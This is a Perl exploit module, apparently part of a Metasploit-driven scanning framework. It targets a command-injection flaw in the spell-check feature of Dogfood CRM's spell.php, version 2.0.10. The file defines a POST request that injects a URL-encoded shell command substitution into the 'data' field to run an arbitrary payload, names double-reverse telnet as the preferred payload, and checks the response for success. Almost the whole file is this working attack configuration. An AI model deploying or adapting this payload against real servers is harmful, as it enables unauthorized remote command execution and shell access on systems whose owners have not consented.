package DOGFOOD::MSF::DogfoodSpellExec;
use lib qw(../../); use parent qw(Exploit);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use File::Slurp qw(read_file);

# # 
# # 
# # 

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   

   my $name = "DogfoodSpellExec";

   my $DETECTION = {

   };

my $EXPLOIT = {
  DESCRIPTION => "

          This module exploits a previously unpublished vulnerability in the

        Dogfood CRM mail function which is vulnerable to command injection

        in the spell check feature.  Because of character restrictions, this

        exploit works best with the double-reverse telnet payload. This

        vulnerability was discovered by LSO and affects v2.0.10.

      ",
  MSF_MODULE => "dogfood_spell_exec",
  OSVDB => 54707,
  REFERENCES => ["http://downloads.sourceforge.net/dogfood/"],
  TITLE => "Dogfood CRM spell.php Remote Command Execution",


  TYPE => 'MSF',
  PLATFORM => 'UNIX',
  REQUESTS => {
    EXPLOIT1 => {
      METHOD       => 'POST',
      PATH   => '',
      PAYLOAD      => 'data=%24%28%20__PAYLOAD__%20%26%29x',
      TEXT   => 'Sending Exploit #1 Request : [POST] /',
      HEADERS      => {
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
  },
   };

   return $class->SUPER::new($name, $DETECTION, $EXPLOIT, @_);
}

return 1;
